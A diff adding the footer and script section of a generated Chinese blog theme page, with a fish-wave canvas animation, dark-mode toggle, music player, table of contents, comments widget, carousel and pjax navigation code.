+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  
+    <!-- 底部鱼儿跳动效果，依赖于jquery-->
+<div id="j-fish-skip" style=" position: relative;height: 153px;width: auto;"></div>
+<script defer>
+  var RENDERER = {
+    POINT_INTERVAL: 5,
+    FISH_COUNT: 3,
+    MAX_INTERVAL_COUNT: 50,
+    INIT_HEIGHT_RATE: .5,
+    THRESHOLD: 50,
+    FISH_COLOR: '',
+    init: function () {
+      this.setFishColor(); this.setParameters(), this.reconstructMethods(), this.setup(), this.bindEvent(), this.render()
+    },
+    setFishColor: function () {
+      let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+      if (isDark) {
+        this.FISH_COLOR = '#222'; // 暗黑色，有时间把这整成一个变量
+      } else {
+        this.FISH_COLOR = '' || 'rgba(66, 185, 133, 0.8)';
+      }
+    },
+    setParameters: function () {
+      this.$window = $(window), this.$container = $("#j-fish-skip"), this.$canvas = $("<canvas />"), this.context = this.$canvas.appendTo(this.$container).get(0).getContext("2d"), this.points = [], this.fishes = [], this.watchIds = []
+    },
+    createSurfacePoints: function () {
+      var t = Math.round(this.width / this.POINT_INTERVAL);
+      this.pointInterval = this.width / (t - 1), this.points.push(new SURFACE_POINT(this, 0));
+      for (var i = 1; i < t; i++) {
+        var e = new SURFACE_POINT(this, i * this.pointInterval),
+          h = this.points[i - 1];
+        e.setPreviousPoint(h), h.setNextPoint(e), this.points.push(e)
+      }
+    },
+    reconstructMethods: function () {
+      this.watchWindowSize = this.watchWindowSize.bind(this), this.jdugeToStopResize = this.jdugeToStopResize.bind(this), this.startEpicenter = this.startEpicenter.bind(this), this.moveEpicenter = this.moveEpicenter.bind(this), this.reverseVertical = this.reverseVertical.bind(this), this.render = this.render.bind(this)
+    },
+    setup: function () {
+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark" onclick="toggleDarkMode()">
+  <div class="dark-content">
+    <i class="fas" id="darkIcon" aria-hidden="true"></i>
+  </div>
+</div>
+
+<script defer>
+  $(function() {
+    // 初始化暗黑模式状态
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    updateDarkModeIcon(isDark);
+  });
+
+  function toggleDarkMode() {
+    const isDark = $(document.body).hasClass('darkModel');
+    $(document.body).toggleClass('darkModel');
+    localStorage.setItem('dark', !isDark);
+    updateDarkModeIcon(!isDark);
+  }
+
+  function updateDarkModeIcon(isDark) {
+    const iconElement = document.getElementById('darkIcon');
+    if (isDark) {
+      iconElement.classList.remove('fa-moon');
+      iconElement.classList.add('fa-lightbulb');
+    } else {
+      iconElement.classList.remove('fa-lightbulb');
+      iconElement.classList.add('fa-moon');
+    }
+  }
+</script>
+
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script defer src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script defer src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script defer src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script async>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script async type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 20,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+        <script type="text/javascript">
+  var utteranceComment = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceComment.Theme = 'github-dark';
+    } else {
+      utteranceComment.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceComment.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceComment.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+      
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script async src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script async src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
